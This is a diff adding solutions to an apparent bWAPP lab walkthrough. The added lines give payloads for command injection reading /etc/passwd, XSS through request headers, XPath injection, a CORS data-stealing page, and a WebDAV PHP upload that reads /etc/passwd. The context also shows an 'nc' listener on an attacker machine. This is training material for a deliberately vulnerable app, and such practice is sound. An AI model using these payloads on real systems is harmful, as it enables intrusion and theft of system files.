@@ -43,6 +43,24 @@ Attacker's machine:
 nc -l 80
 ```
 
+### iFrame Injection
+```
+ParamUrl=robots.txt" onload="alert(1)
+ParamHeight="></iframe><script>alert(1);</script>
+```
+
+### OS Command Injection
+```
+www.nsa.gov; cat /etc/passwd
+www.nsa.gov & cat /etc/passwd
+www.nsa.gov | cat /etc/passwd
+```
+
+### OS Command Injection - Blind
+```
+www.nsa.gov | sleep 10
+```
+
 ### PHP Code Injection
 
 ```
@@ -121,6 +139,18 @@ asdf',(SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'bW
 asdf',(select password from mysql.user where user='root' ))-- 
 ```
 
+### XML/XPath Injection (Login Form)
+```
+password=' or id='2
+```
+
+### XML/XPath Injection (Search)
+```
+genre=')]/password | a[contains(a,'
+genre=') or contains(genre, '
+genre=') or not(contains(genre, 'xxx') and '1'='2
+```
+
 # A2 - Broken Authentication
 
 ### Broken Auth. - CAPTCHA Bypassing
@@ -143,6 +173,15 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 34
 
 login=bee&password=bug&form=submit
+```
+
+### Broken Auth. - Logout Management
+Open second tab and logout. Second tab will still have session.
+
+### Session Mgmt. - Administrative Portals
+In URL and Cookies
+```
+admin=1
 ```
 
 # A3 - Cross-Site Scripting (XSS) 
@@ -186,6 +225,33 @@ Alternatively I was able to get XSS to execute on the AJAX called.
 xss_ajax_1-2.php?title=<html xmlns='http://www.w3.org/1999/xhtml'><script>prompt(0)</script></html>
 ```
 
+### XSS - Reflected (Back Button)
+Modify Referer header field
+```
+Referer: ';alert(1);'
+```
+
+### XSS - Reflected (Custom Header)
+Add header field
+```
+bWAPP: <script>alert(1)</script>
+```
+
+### XSS - Reflected (Eval)
+```
+date=alert(1)
+```
+
+### XSS - Reflected (HREF)
+```
+Referer: <script>alert(1)</script>
+```
+
+### XSS - Reflected (User-Agent)
+```
+User-Agent: <script>alert(1)</script>
+```
+
 # A4 - Insecure Direct Object References
 
 ### Insecure DOR (Change Secret)
@@ -217,6 +283,32 @@ bWAPP/insecure_direct_object_ref_2.php
 Use Burp to unhide hidden ticket price field, or use proxy to modify the POST param while in transit.
 
 # A5 - Security Misconfiguration
+
+### Cross-Origin Resource Sharing (AJAX)
+It's possible because of header in response:
+```
+Access-Control-Allow-Origin: *
+```
+```
+<html>
+    <head>
+    <script>
+        function steal() {
+            var r = new XMLHttpRequest();
+            r.onreadystatechange = function() {
+                if (r.readyState == 4 && r.status == 200) {
+                    alert(r.responseText);
+                }
+            };
+            r.open("GET", "http://192.168.1.10/bWAPP/secret-cors-1.php", true);
+            r.send();
+        }
+    </script>
+    </head>
+    <body onload="steal()">
+    </body>
+</html>
+```
 
 ### Cross-Site Tracing (XST) 
 
@@ -303,6 +395,11 @@ Default community strings are set on the machine
 ```
 $ snmpwalk -v2c -c private bwapp-server
 $ snmpwalk -v2c -c public bwapp-server
+```
+
+### Insecure WebDAV Configuration
+```
+curl -X PUT --data '<?php $f=fopen("/etc/passwd","r"); echo fread($f,filesize("/etc/passwd")); fclose($f); ?>' 'http://192.168.1.10/webdav/attack.php'
 ```
 
 # A6 - Sensitive Data Exposure 
